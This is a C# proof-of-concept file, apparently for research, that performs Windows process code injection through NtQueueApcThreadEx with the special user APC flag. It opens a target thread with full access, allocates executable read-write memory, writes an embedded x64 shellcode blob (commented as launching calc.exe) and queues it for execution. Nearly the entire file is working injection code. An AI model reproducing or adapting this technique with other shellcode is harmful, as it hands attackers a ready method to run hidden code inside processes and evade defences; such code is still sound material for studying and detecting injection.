using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Windows;
using Newtonsoft.Json;

namespace QueueUserApcPoC;

public static class ApcInjection
{
    #region Native

    #region Ntdll

    public readonly struct NtStatus : IEquatable<NtStatus>
    {
        public readonly int Value;

        public NtStatus(int Status) => this.Value = Status;

        public static implicit operator int(NtStatus Status) => Status.Value;

        public static explicit operator NtStatus(int Status) => new NtStatus(Status);

        public static bool operator ==(NtStatus Left, NtStatus Right) => Left.Value == Right.Value;

        public static bool operator !=(NtStatus Left, NtStatus Right) => !(Left == Right);

        public bool Equals(NtStatus Other) => this.Value == Other.Value;

        public override bool Equals(object Obj) => Obj is NtStatus Other && this.Equals(Other);

        public override int GetHashCode() => this.Value.GetHashCode();

        public override string ToString() => $"0x{this.Value:x}";

        public static implicit operator uint(NtStatus Status) => (uint)Status.Value;

        public static explicit operator NtStatus(uint Status) => new NtStatus((int)Status);

        public Severity SeverityCode => (Severity)(((uint)this.Value & 0xc0000000) >> 30);

        public enum Severity
        {
            Success,
            Informational,
            Warning,
            Error,
        }

        public static readonly NtStatus Success = (NtStatus)0;
    }

    public enum UserApcFlags : uint
    {
        QueueUserApcFlagsNone,
        QueueUserApcFlagsSpecialUserApc,
        QueueUserApcFlagsMaxValue
    }

    [StructLayout(LayoutKind.Explicit)]
    public struct UserApcOption
    {
        [FieldOffset(0)]
        public UserApcFlags UserApcFlags;
        [FieldOffset(0)]
        public IntPtr MemoryReserveHandle;
    }

    public delegate void UserApcRoutine(IntPtr SystemArgument1, IntPtr SystemArgument2, IntPtr SystemArgument3);

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern NtStatus NtQueueApcThreadEx(
        IntPtr hThread,
        UserApcOption UserApcOption,
        UserApcRoutine ApcRoutine,
        IntPtr SystemArgument1,
        IntPtr SystemArgument2,
        IntPtr SystemArgument3);

    #endregion

    #region Kernel32

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenThread(
        ThreadAccess DesiredAccess,
        bool InheritHandle,
        int ThreadId);

    [Flags]
    public enum ThreadAccess : int
    {
        Terminate = 0x0001,
        SuspendResume = 0x0002,
        GetContext = 0x0008,
        SetContext = 0x0010,
        SetInformation = 0x0020,
        QueryInformation = 0x0040,
        SetThreadToken = 0x0080,
        Impersonate = 0x0100,
        DirectImpersonation = 0x0200,
        All = Terminate | SuspendResume | GetContext | SetContext | SetInformation | QueryInformation | SetThreadToken | Impersonate | DirectImpersonation
    }

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentThread();

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        int dwSize,
        AllocationType flAllocationType,
        MemoryProtection flProtect);

    [Flags]
    public enum AllocationType : uint
    {
        Commit = 0x1000,
        Reserve = 0x2000,
        Decommit = 0x4000,
        Release = 0x8000,
        Reset = 0x80000,
        Physical = 0x400000,
        TopDown = 0x100000,
        WriteWatch = 0x200000,
        LargePages = 0x20000000
    }

    [Flags]
    public enum MemoryProtection : uint
    {
        NoAccess = 0x01,
        ReadOnly = 0x02,
        ReadWrite = 0x04,
        WriteCopy = 0x08,
        Execute = 0x10,
        ExecuteRead = 0x20,
        ExecuteReadWrite = 0x40,
        ExecuteWriteCopy = 0x80,
        GuardModifierflag = 0x100,
        NoCacheModifierflag = 0x200,
        WriteCombineModifierflag = 0x400
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        uint nSize,
        out uint lpNumberOfBytesWritten);

    #endregion

    #endregion

    public static bool Inject(int ThreadId, IntPtr hProc)
    {
        /* Open The Thread */
        IntPtr hThread = OpenThread(
            ThreadAccess.All, 
            false, 
            ThreadId);

        /* Create The Options Struct With Our Special Flag */
        UserApcOption Options = new UserApcOption { UserApcFlags = UserApcFlags.QueueUserApcFlagsSpecialUserApc };

        /* x64 Shellcode To Open Calc.exe */
        byte[] Buffer =
        {
            0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
            0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
            0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
            0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
            0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
            0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
            0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
            0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
            0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
            0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
            0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
            0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
            0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
            0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
            0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
            0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
            0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
            0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
            0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
            0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
            0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
            0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
            0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
        };
        
        /* Allocate Memory For Our Shellcode */
        IntPtr Memory = VirtualAlloc(
            IntPtr.Zero,
            Buffer.Length,
            AllocationType.Commit | AllocationType.Reserve,
            MemoryProtection.ExecuteReadWrite);

        /* Write Our Shellcode Into Memory */
        WriteProcessMemory(
            hProc,
            Memory,
            Buffer,
            (uint)Buffer.Length, out _);

        /* Get Our Memory To A Routine Delegate */
        UserApcRoutine Routine = Marshal.GetDelegateForFunctionPointer<UserApcRoutine>(Memory);

        /* Queue Our APC (Also Errors For Invalid Memory Access???) */
        NtStatus Status = NtQueueApcThreadEx(
            hThread,
            Options,
            Routine,
            IntPtr.Zero,
            IntPtr.Zero,
            IntPtr.Zero);

        return Status == NtStatus.Success;
    }
}
